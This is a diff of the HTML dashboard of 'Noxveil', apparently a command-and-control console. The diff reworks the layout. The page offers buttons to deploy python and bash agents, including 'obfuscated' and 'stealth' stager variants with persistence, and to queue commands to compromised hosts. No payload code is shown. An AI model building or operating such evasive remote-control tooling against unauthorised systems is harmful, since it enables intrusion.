@@ -3,34 +3,30 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="color-scheme" content="dark">
     <title>Noxveil // dashboard</title>
     <link rel="stylesheet" href="/css/style.css">
     <style>
-        .deploy-panel { position: relative; }
-        .deploy-command { user-select: all; }
-
-        .dashboard-shell .deploy-grid {
-            grid-template-columns: repeat(4, minmax(0, 1fr));
+        .deck-tiles {
+            display: grid;
+            grid-template-columns: repeat(2, minmax(0, 1fr));
             gap: 10px;
-            margin-top: 12px;
+            margin-top: 18px;
         }
 
-        .dashboard-shell .deploy-card { height: 100%; }
-        .dashboard-shell .activity-feed { max-height: 440px; }
-
-        @media (max-width: 1280px) {
-            .dashboard-shell .deploy-grid { grid-template-columns: repeat(2, minmax(0, 1fr)); }
+        .deck-tile {
+            display: grid;
+            gap: 8px;
+            padding: 13px 14px;
+            border: 1px solid var(--line);
+            border-radius: var(--r-4);
+            background: var(--ink-2);
+            min-width: 0;
         }
 
         @media (max-width: 720px) {
-            .dashboard-shell .deploy-grid { grid-template-columns: 1fr; }
+            .deck-tiles { grid-template-columns: 1fr; }
         }
-
-        #quickCommand { flex: 1; min-width: 0; }
-        .deploy-command-bash { background: var(--ink-0); }
-
-        .command-deck-card { padding-left: 28px; padding-right: 28px; }
-        .security-summary .gap-1 { display: flex; flex-wrap: wrap; gap: 8px; }
     </style>
 </head>
 <body>
@@ -46,13 +42,50 @@
         <span>copied</span>
     </div>
 
-    <nav class="navbar">
-        <div class="container">
-            <div class="navbar-content">
-                <div class="navbar-brand">
-                    NOXVEIL <span>//</span> OPCON
+    <div class="app-shell">
+        <aside class="sidebar" id="sidebar" aria-label="Primary navigation">
+            <div class="sidebar-brand">
+                <span class="brand-mark" aria-hidden="true">N</span>
+                <span class="brand-name">Noxveil<span class="brand-sub">opcon</span></span>
+            </div>
+            <nav class="sidebar-nav">
+                <div class="nav-section">workspace</div>
+                <a class="sidebar-link active" href="/dashboard" aria-current="page">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="3" y="3" width="7" height="7" rx="1.5"/><rect x="14" y="3" width="7" height="7" rx="1.5"/><rect x="3" y="14" width="7" height="7" rx="1.5"/><rect x="14" y="14" width="7" height="7" rx="1.5"/></svg>
+                    Dashboard
+                </a>
+                <a class="sidebar-link" href="/terminal">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>
+                    Agent terminal
+                </a>
+                <a class="sidebar-link" href="/shell">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="2" y="3" width="20" height="7" rx="2"/><rect x="2" y="14" width="20" height="7" rx="2"/><line x1="6" y1="6.5" x2="6.01" y2="6.5"/><line x1="6" y1="17.5" x2="6.01" y2="17.5"/></svg>
+                    Server shell
+                </a>
+            </nav>
+            <div class="sidebar-foot">
+                <div class="operator-chip">
+                    <span class="operator-dot" aria-hidden="true"></span>
+                    <span>operator</span>
                 </div>
-                <div class="navbar-stats" id="statsBar">
+                <button class="btn btn-small btn-ghost" id="logoutBtn">Sign out</button>
+            </div>
+        </aside>
+
+        <div class="sidebar-scrim" id="sidebarScrim" aria-hidden="true"></div>
+
+        <div class="app-main">
+            <header class="topbar">
+                <div class="topbar-left">
+                    <button class="icon-btn" id="sidebarToggle" aria-label="Toggle navigation" aria-controls="sidebar">
+                        <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" aria-hidden="true"><line x1="4" y1="7" x2="20" y2="7"/><line x1="4" y1="12" x2="20" y2="12"/><line x1="4" y1="17" x2="20" y2="17"/></svg>
+                    </button>
+                    <div class="topbar-titles">
+                        <div class="topbar-title">Dashboard</div>
+                        <div class="topbar-sub">fleet overview · deploy · audit</div>
+                    </div>
+                </div>
+                <div class="topbar-right">
                     <div class="stat-badge">
                         agents <span class="stat-number" id="totalAgents">0</span>
                     </div>
@@ -65,250 +98,260 @@
                     <div class="stat-badge tasks">
                         tasks <span class="stat-number" id="totalTasks">0</span>
                     </div>
-                </div>
-                <div class="navbar-actions">
-                    <a href="/shell" class="btn btn-small">▸ shell</a>
-                    <div class="tunnel-url" id="tunnelUrl" title="Click to copy">
-                        → <span id="tunnelUrlText">resolving route...</span>
+                    <div class="tunnel-url" id="tunnelUrl" title="Click to copy" role="button" tabindex="0">
+                        <span aria-hidden="true">⇪</span>
+                        <span id="tunnelUrlText">resolving route...</span>
                     </div>
-                    <button class="btn btn-small btn-danger" id="logoutBtn">↻ sign out</button>
                 </div>
-            </div>
+            </header>
+
+            <main class="page">
+                <div id="notifications"></div>
+
+                <section class="overview-grid">
+                    <article class="command-deck-card command-deck-primary">
+                        <div class="command-deck-eyebrow">control room // session</div>
+                        <div class="command-deck-title">Everything important is one keystroke away.</div>
+                        <div class="command-deck-meta" id="commandDeckSummary">Loading workspace state...</div>
+                        <div class="command-deck-pills">
+                            <div class="command-deck-pill" id="operatorIdentityPill">operator: -</div>
+                            <div class="command-deck-pill" id="operatorMfaPill">mfa: -</div>
+                            <div class="command-deck-pill" id="deployCountdownPill">links expire in --</div>
+                        </div>
+                        <div class="deck-tiles">
+                            <div class="deck-tile">
+                                <div class="command-deck-section">access route</div>
+                                <div class="command-deck-metric" id="tunnelHealthValue">checking route</div>
+                                <div class="command-deck-meta" id="tunnelHealthMeta">Waiting for route details...</div>
+                            </div>
+                            <div class="deck-tile">
+                                <div class="command-deck-section">selection</div>
+                                <div class="command-deck-metric" id="selectionMissionValue">0 selected</div>
+                                <div class="command-deck-meta" id="selectionMissionMeta">Pick agents to run a command or open a terminal.</div>
+                            </div>
+                        </div>
+                        <div class="command-deck-actions">
+                            <button class="btn btn-small" id="copyTunnelBtn">copy route</button>
+                            <button class="btn btn-small btn-warning" id="restartTunnelBtn">restart route</button>
+                            <button class="btn btn-small btn-info" id="selectLiveAgentsBtn">select online</button>
+                            <button class="btn btn-small" id="clearSelectionBtn">clear</button>
+                            <button class="btn btn-small btn-primary" id="openSelectedTerminalBtn">open terminal</button>
+                        </div>
+                    </article>
+
+                    <div class="card dashboard-panel dashboard-side-card">
+                        <div class="card-header">
+                            <div class="card-title">account security</div>
+                        </div>
+                        <div class="security-summary">
+                            <div class="security-pill disabled" id="mfaStatusPill">mfa off</div>
+                            <div class="security-meta" id="securityStatusSummary">Loading account details...</div>
+                            <div class="flex flex-wrap gap-1">
+                                <button class="btn btn-small btn-info" id="setupMfaBtn">setup code</button>
+                                <button class="btn btn-small btn-primary" id="enableMfaBtn">enable</button>
+                                <button class="btn btn-small btn-danger" id="disableMfaBtn">disable</button>
+                            </div>
+                            <input type="text" id="mfaCodeInput" placeholder="6-digit authenticator code" aria-label="6-digit authenticator code">
+                            <div class="mfa-secret-block" id="mfaSecretBlock">
+                                <div class="text-secondary" style="font-family: var(--font-mono); font-size: 0.7rem; text-transform: uppercase; letter-spacing: 0.1em;">authenticator setup secret</div>
+                                <div class="mfa-secret-code" id="mfaSecretText">-</div>
+                                <div class="security-meta" id="mfaUriText"></div>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+
+                <section class="card deploy-panel">
+                    <div class="card-header">
+                        <div class="deploy-title">deploy agents</div>
+                        <button class="btn btn-small" id="refreshDeployBtn">refresh links</button>
+                    </div>
+                    <div class="deploy-grid">
+                        <div class="deploy-card">
+                            <div class="deploy-card-title">python</div>
+                            <div class="deploy-card-copy">Full feature set: files, screenshots, persistence, multi-session terminal.</div>
+                            <div class="deploy-command" id="pythonDeployCommand" title="Click to copy">
+                                <span class="spinner deploy-spinner"></span> preparing command...
+                            </div>
+                            <div class="deploy-card-actions">
+                                <button class="btn btn-small btn-primary" id="copyPythonDeployBtn" disabled>copy</button>
+                                <button class="btn btn-small" id="downloadAgentBtn" disabled>download</button>
+                            </div>
+                        </div>
+                        <div class="deploy-card">
+                            <div class="deploy-card-title">python · obfuscated</div>
+                            <div class="deploy-card-copy">Same payload, quieter footprint via name mangling and string mutation.</div>
+                            <div class="deploy-command" id="obfuscatedPythonDeployCommand" title="Click to copy">
+                                <span class="spinner deploy-spinner"></span> preparing command...
+                            </div>
+                            <div class="deploy-card-actions">
+                                <button class="btn btn-small btn-warning" id="copyObfuscatedPythonDeployBtn" disabled>copy</button>
+                                <button class="btn btn-small" id="downloadObfuscatedAgentBtn" disabled>download</button>
+                            </div>
+                        </div>
+                        <div class="deploy-card">
+                            <div class="deploy-card-title">bash</div>
+                            <div class="deploy-card-copy">Lightweight Unix runner. Bash + curl. No Python required.</div>
+                            <div class="deploy-command deploy-command-bash" id="bashDeployCommand" title="Click to copy">
+                                <span class="spinner deploy-spinner"></span> preparing command...
+                            </div>
+                            <div class="deploy-card-actions">
+                                <button class="btn btn-small btn-info" id="copyBashDeployBtn" disabled>copy</button>
+                                <button class="btn btn-small" id="downloadBashAgentBtn" disabled>download</button>
+                            </div>
+                        </div>
+                        <div class="deploy-card deploy-card-stealth">
+                            <div class="deploy-card-title">bash · stealth</div>
+                            <div class="deploy-card-copy">Long-poll bash stager with cleanup, stateful shell, lower-friction one-liner.</div>
+                            <div class="deploy-command deploy-command-bash deploy-command-stealth" id="stealthBashDeployCommand" title="Click to copy">
+                                <span class="spinner deploy-spinner"></span> preparing command...
+                            </div>
+                            <div class="deploy-card-actions">
+                                <button class="btn btn-small btn-warning" id="copyStealthBashDeployBtn" disabled>copy</button>
+                                <button class="btn btn-small" id="downloadStealthBashAgentBtn" disabled>download</button>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="deploy-expiry-note" id="deployExpiry">// preparing signed launch links</div>
+                </section>
+
+                <section class="dashboard-secondary-grid">
+                    <div class="card dashboard-panel">
+                        <div class="card-header">
+                            <div class="card-title">quick command</div>
+                        </div>
+                        <div class="flex gap-1">
+                            <input type="text" id="quickCommand" placeholder="$ whoami" autocomplete="off" aria-label="Quick command">
+                            <button class="btn btn-primary" id="sendQuickCmd">queue</button>
+                        </div>
+                        <div class="command-presets" id="commandPresets">
+                            <button class="command-preset" data-command="whoami">whoami</button>
+                            <button class="command-preset" data-command="hostname">hostname</button>
+                            <button class="command-preset" data-command="pwd">pwd</button>
+                            <button class="command-preset" data-command="ps aux | head">ps aux | head</button>
+                            <button class="command-preset" data-command="ipconfig /all">ipconfig /all</button>
+                            <button class="command-preset" data-command="ifconfig">ifconfig</button>
+                            <button class="command-preset" data-command="!info">!info</button>
+                            <button class="command-preset" data-command="!sleep 30">!sleep 30</button>
+                        </div>
+                        <label class="quick-command-toggle">
+                            <span class="toggle-switch">
+                                <input type="checkbox" id="broadcastOnlineToggle">
+                                <span class="toggle-track"></span>
+                            </span>
+                            <span>broadcast to every online agent</span>
+                        </label>
+                        <div class="quick-cmd-status" id="quickCmdStatus"></div>
+                    </div>
+
+                    <div class="card dashboard-panel dashboard-activity-card">
+                        <div class="card-header">
+                            <div class="card-title">recent activity</div>
+                            <button class="btn btn-small" id="refreshAuditBtn">refresh</button>
+                        </div>
+                        <div class="activity-filter-row">
+                            <input type="text" id="auditSearchInput" placeholder="filter activity..." aria-label="Filter activity">
+                            <select id="auditTypeFilter" aria-label="Activity type filter">
+                                <option value="all">all types</option>
+                                <option value="auth">auth</option>
+                                <option value="agent">agent</option>
+                                <option value="deploy">deploy</option>
+                                <option value="security">security</option>
+                            </select>
+                        </div>
+                        <div class="activity-feed" id="auditLogList">
+                            <div class="activity-item">
+                                <div class="activity-event">loading recent activity...</div>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+
+                <section class="card dashboard-panel dashboard-agents-card">
+                    <div class="card-header">
+                        <div class="card-title">managed agents</div>
+                        <div class="managed-agents-toolbar">
+                            <div class="managed-agents-summary" id="agentSelectionSummary">0 tracked</div>
+                            <button class="btn btn-small" id="refreshAgentsBtn">refresh</button>
+                        </div>
+                    </div>
+                    <div class="managed-agents-tools">
+                        <div class="managed-agents-filters">
+                            <input type="text" id="agentSearchInput" placeholder="search host, user, ip, platform, note, id" aria-label="Search agents">
+                            <select id="agentStatusFilter" aria-label="Agent state filter">
+                                <option value="all">all states</option>
+                                <option value="online">online only</option>
+                                <option value="offline">offline only</option>
+                                <option value="selected">selected only</option>
+                            </select>
+                            <select id="agentSortSelect" aria-label="Agent sorting">
+                                <option value="health">health · last seen</option>
+                                <option value="hostname">hostname a→z</option>
+                                <option value="last_seen">most recent</option>
+                                <option value="callback">fastest callback</option>
+                            </select>
+                        </div>
+                        <div class="managed-agents-bulk-actions">
+                            <button class="btn btn-small" id="copySelectedIdsBtn">copy ids</button>
+                            <button class="btn btn-small" id="copySelectedHostsBtn">copy hosts</button>
+                            <button class="btn btn-small btn-info" id="queueInfoBtn">queue !info</button>
+                        </div>
+                    </div>
+                    <div class="managed-agents-mission" id="managedAgentsMission">
+                        pick one agent for live terminal · select multiple to fan-out the same command
+                    </div>
+                    <div class="managed-agents-controls">
+                        <label class="managed-agents-select-all" for="selectAll">
+                            <input type="checkbox" id="selectAll" title="Select all agents">
+                            <span>select all visible</span>
+                        </label>
+                        <div class="managed-agents-hint">// auto-refresh every 5s</div>
+                    </div>
+                    <div class="managed-agents-grid" id="agentCards">
+                        <div class="agent-card agent-card-loading">
+                            <div class="spinner"></div>
+                            <div class="managed-agents-loading-text">loading agents...</div>
+                        </div>
+                    </div>
+                </section>
+            </main>
         </div>
-    </nav>
+    </div>
 
-    <main class="container dashboard-shell">
-        <div id="notifications"></div>
-
-        <section class="command-deck">
-            <article class="command-deck-card command-deck-primary">
-                <div class="command-deck-eyebrow">control room // session</div>
-                <div class="command-deck-title">Everything important is one keystroke away.</div>
-                <div class="command-deck-meta" id="commandDeckSummary">Loading workspace state...</div>
-                <div class="command-deck-pills">
-                    <div class="command-deck-pill" id="operatorIdentityPill">operator: -</div>
-                    <div class="command-deck-pill" id="operatorMfaPill">mfa: -</div>
-                    <div class="command-deck-pill" id="deployCountdownPill">links expire in --</div>
-                </div>
-                <div class="dashboard-top-grid" style="margin-top: 22px;">
-                    <div style="display: grid; gap: 10px; padding: 14px; border: 1px solid var(--line); border-radius: var(--r-4); background: var(--ink-1);">
-                        <div class="command-deck-section">access route</div>
-                        <div class="command-deck-metric" id="tunnelHealthValue">checking route</div>
-                        <div class="command-deck-meta" id="tunnelHealthMeta">Waiting for route details...</div>
-                    </div>
-                    <div style="display: grid; gap: 10px; padding: 14px; border: 1px solid var(--line); border-radius: var(--r-4); background: var(--ink-1);">
-                        <div class="command-deck-section">selection</div>
-                        <div class="command-deck-metric" id="selectionMissionValue">0 selected</div>
-                        <div class="command-deck-meta" id="selectionMissionMeta">Pick agents to run a command or open a terminal.</div>
-                    </div>
-                </div>
-                <div class="command-deck-actions">
-                    <button class="btn btn-small" id="copyTunnelBtn">copy route</button>
-                    <button class="btn btn-small btn-warning" id="restartTunnelBtn">restart route</button>
-                    <button class="btn btn-small btn-info" id="selectLiveAgentsBtn">select online</button>
-                    <button class="btn btn-small" id="clearSelectionBtn">clear</button>
-                    <button class="btn btn-small btn-primary" id="openSelectedTerminalBtn">▸ open terminal</button>
-                </div>
-            </article>
-        </section>
-
-        <section class="dashboard-top-grid">
-            <div class="card deploy-panel dashboard-panel">
-                <div class="card-header">
-                    <div class="deploy-title">deploy agents</div>
-                    <button class="btn btn-small" id="refreshDeployBtn">↻ refresh links</button>
-                </div>
-                <div class="deploy-grid">
-                    <div class="deploy-card">
-                        <div class="deploy-card-title">▸ python</div>
-                        <div class="deploy-card-copy">Full feature set: files, screenshots, persistence, multi-session terminal.</div>
-                        <div class="deploy-command" id="pythonDeployCommand" title="Click to copy">
-                            <span class="spinner deploy-spinner"></span> preparing command...
-                        </div>
-                        <div class="deploy-card-actions">
-                            <button class="btn btn-small btn-primary" id="copyPythonDeployBtn" disabled>copy</button>
-                            <button class="btn btn-small" id="downloadAgentBtn" disabled>download</button>
-                        </div>
-                    </div>
-                    <div class="deploy-card">
-                        <div class="deploy-card-title">▸ python · obfuscated</div>
-                        <div class="deploy-card-copy">Same payload, quieter footprint via name mangling and string mutation.</div>
-                        <div class="deploy-command" id="obfuscatedPythonDeployCommand" title="Click to copy">
-                            <span class="spinner deploy-spinner"></span> preparing command...
-                        </div>
-                        <div class="deploy-card-actions">
-                            <button class="btn btn-small btn-warning" id="copyObfuscatedPythonDeployBtn" disabled>copy</button>
-                            <button class="btn btn-small" id="downloadObfuscatedAgentBtn" disabled>download</button>
-                        </div>
-                    </div>
-                    <div class="deploy-card">
-                        <div class="deploy-card-title">▸ bash</div>
-                        <div class="deploy-card-copy">Lightweight Unix runner. Bash + curl. No Python required.</div>
-                        <div class="deploy-command deploy-command-bash" id="bashDeployCommand" title="Click to copy">
-                            <span class="spinner deploy-spinner"></span> preparing command...
-                        </div>
-                        <div class="deploy-card-actions">
-                            <button class="btn btn-small btn-info" id="copyBashDeployBtn" disabled>copy</button>
-                            <button class="btn btn-small" id="downloadBashAgentBtn" disabled>download</button>
-                        </div>
-                    </div>
-                    <div class="deploy-card deploy-card-stealth">
-                        <div class="deploy-card-title">▸ bash · stealth</div>
-                        <div class="deploy-card-copy">Long-poll bash stager with cleanup, stateful shell, lower-friction one-liner.</div>
-                        <div class="deploy-command deploy-command-bash deploy-command-stealth" id="stealthBashDeployCommand" title="Click to copy">
-                            <span class="spinner deploy-spinner"></span> preparing command...
-                        </div>
-                        <div class="deploy-card-actions">
-                            <button class="btn btn-small btn-warning" id="copyStealthBashDeployBtn" disabled>copy</button>
-                            <button class="btn btn-small" id="downloadStealthBashAgentBtn" disabled>download</button>
-                        </div>
-                    </div>
-                </div>
-                <div class="deploy-expiry-note" id="deployExpiry">// preparing signed launch links</div>
-            </div>
-
-            <div class="card dashboard-panel dashboard-side-card">
-                <div class="card-header">
-                    <div class="card-title">account security</div>
-                </div>
-                <div class="security-summary">
-                    <div class="security-pill disabled" id="mfaStatusPill">mfa off</div>
-                    <div class="security-meta" id="securityStatusSummary">Loading account details...</div>
-                    <div class="gap-1">
-                        <button class="btn btn-small btn-info" id="setupMfaBtn">setup code</button>
-                        <button class="btn btn-small btn-primary" id="enableMfaBtn">enable</button>
-                        <button class="btn btn-small btn-danger" id="disableMfaBtn">disable</button>
-                    </div>
-                    <input type="text" id="mfaCodeInput" placeholder="6-digit authenticator code">
-                    <div class="mfa-secret-block" id="mfaSecretBlock">
-                        <div class="text-secondary" style="font-family: var(--font-mono); font-size: 0.74rem; text-transform: uppercase; letter-spacing: 0.1em;">▸ authenticator setup secret</div>
-                        <div class="mfa-secret-code" id="mfaSecretText">-</div>
-                        <div class="security-meta" id="mfaUriText"></div>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <section class="dashboard-secondary-grid">
-            <div class="card dashboard-panel">
-                <div class="card-header">
-                    <div class="card-title">quick command</div>
-                </div>
-                <div class="flex gap-1">
-                    <input type="text" id="quickCommand" placeholder="$ whoami" autocomplete="off">
-                    <button class="btn btn-primary" id="sendQuickCmd">▸ queue</button>
-                </div>
-                <div class="command-presets" id="commandPresets">
-                    <button class="command-preset" data-command="whoami">whoami</button>
-                    <button class="command-preset" data-command="hostname">hostname</button>
-                    <button class="command-preset" data-command="pwd">pwd</button>
-                    <button class="command-preset" data-command="ps aux | head">ps aux | head</button>
-                    <button class="command-preset" data-command="ipconfig /all">ipconfig /all</button>
-                    <button class="command-preset" data-command="ifconfig">ifconfig</button>
-                    <button class="command-preset" data-command="!info">!info</button>
-                    <button class="command-preset" data-command="!sleep 30">!sleep 30</button>
-                </div>
-                <label class="quick-command-toggle">
-                    <span class="toggle-switch">
-                        <input type="checkbox" id="broadcastOnlineToggle">
-                        <span class="toggle-track"></span>
-                    </span>
-                    <span>broadcast to every online agent</span>
-                </label>
-                <div class="quick-cmd-status" id="quickCmdStatus"></div>
-            </div>
-
-            <div class="card dashboard-panel dashboard-activity-card">
-                <div class="card-header">
-                    <div class="card-title">recent activity</div>
-                    <button class="btn btn-small" id="refreshAuditBtn">↻ refresh</button>
-                </div>
-                <div class="activity-filter-row">
-                    <input type="text" id="auditSearchInput" placeholder="filter activity...">
-                    <select id="auditTypeFilter">
-                        <option value="all">all types</option>
-                        <option value="auth">auth</option>
-                        <option value="agent">agent</option>
-                        <option value="deploy">deploy</option>
-                        <option value="security">security</option>
-                    </select>
-                </div>
-                <div class="activity-feed" id="auditLogList">
-                    <div class="activity-item">
-                        <div class="activity-event">loading recent activity...</div>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <section class="card dashboard-panel dashboard-agents-card">
-            <div class="card-header">
-                <div class="card-title">managed agents</div>
-                <div class="managed-agents-toolbar">
-                    <div class="managed-agents-summary" id="agentSelectionSummary">0 tracked</div>
-                    <button class="btn btn-small" id="refreshAgentsBtn">↻ refresh</button>
-                </div>
-            </div>
-            <div class="managed-agents-tools">
-                <div class="managed-agents-filters">
-                    <input type="text" id="agentSearchInput" placeholder="search host, user, ip, platform, note, id">
-                    <select id="agentStatusFilter">
-                        <option value="all">all states</option>
-                        <option value="online">online only</option>
-                        <option value="offline">offline only</option>
-                        <option value="selected">selected only</option>
-                    </select>
-                    <select id="agentSortSelect">
-                        <option value="health">health · last seen</option>
-                        <option value="hostname">hostname a→z</option>
-                        <option value="last_seen">most recent</option>
-                        <option value="callback">fastest callback</option>
-                    </select>
-                </div>
-                <div class="managed-agents-bulk-actions">
-                    <button class="btn btn-small" id="copySelectedIdsBtn">copy ids</button>
-                    <button class="btn btn-small" id="copySelectedHostsBtn">copy hosts</button>
-                    <button class="btn btn-small btn-info" id="queueInfoBtn">queue !info</button>
-                </div>
-            </div>
-            <div class="managed-agents-mission" id="managedAgentsMission">
-                pick one agent for live terminal · select multiple to fan-out the same command
-            </div>
-            <div class="managed-agents-controls">
-                <label class="managed-agents-select-all" for="selectAll">
-                    <input type="checkbox" id="selectAll" title="Select all agents">
-                    <span>select all visible</span>
-                </label>
-                <div class="managed-agents-hint">// auto-refresh every 5s</div>
-            </div>
-            <div class="managed-agents-grid" id="agentCards">
-                <div class="agent-card agent-card-loading">
-                    <div class="spinner"></div>
-                    <div class="managed-agents-loading-text">loading agents...</div>
-                </div>
-            </div>
-        </section>
-    </main>
-
-    <div class="modal" id="agentModal">
+    <div class="modal" id="agentModal" role="dialog" aria-modal="true" aria-labelledby="agentModalTitle">
         <div class="modal-content">
             <div class="modal-header">
-                <h3>edit agent</h3>
+                <h3 id="agentModalTitle">Edit agent</h3>
             </div>
             <div class="modal-body">
                 <div class="mb-1">
-                    <label for="agentNote">note</label>
+                    <label for="agentNote">Note</label>
                     <textarea id="agentNote" rows="4" placeholder="// add a note for this agent"></textarea>
                 </div>
                 <div class="mb-1">
-                    <label for="agentInterval">callback interval (seconds)</label>
+                    <label for="agentInterval">Callback interval (seconds)</label>
                     <input type="number" id="agentInterval" min="1" max="300" value="5">
                     <small class="form-hint">how often the agent checks in for new tasks</small>
                 </div>
             </div>
             <div class="modal-actions">
-                <button class="btn" id="cancelModal">cancel</button>
-                <button class="btn btn-primary" id="saveModal">▸ save</button>
+                <button class="btn" id="cancelModal">Cancel</button>
+                <button class="btn btn-primary" id="saveModal">Save</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="modal" id="confirmModal" role="dialog" aria-modal="true" aria-labelledby="confirmTitle">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3 id="confirmTitle">Confirm action</h3>
+            </div>
+            <div class="modal-body">
+                <p id="confirmMessage" class="confirm-message"></p>
+            </div>
+            <div class="modal-actions">
+                <button class="btn" id="confirmCancelBtn">Cancel</button>
+                <button class="btn btn-danger" id="confirmOkBtn">Confirm</button>
             </div>
         </div>
     </div>
@@ -322,6 +365,14 @@
                 return;
             }
             App.init();
+        });
+
+        // Navigation drawer (mobile)
+        document.getElementById("sidebarToggle")?.addEventListener("click", () => {
+            document.body.classList.toggle("sidebar-open");
+        });
+        document.getElementById("sidebarScrim")?.addEventListener("click", () => {
+            document.body.classList.remove("sidebar-open");
         });
     </script>
 </body>
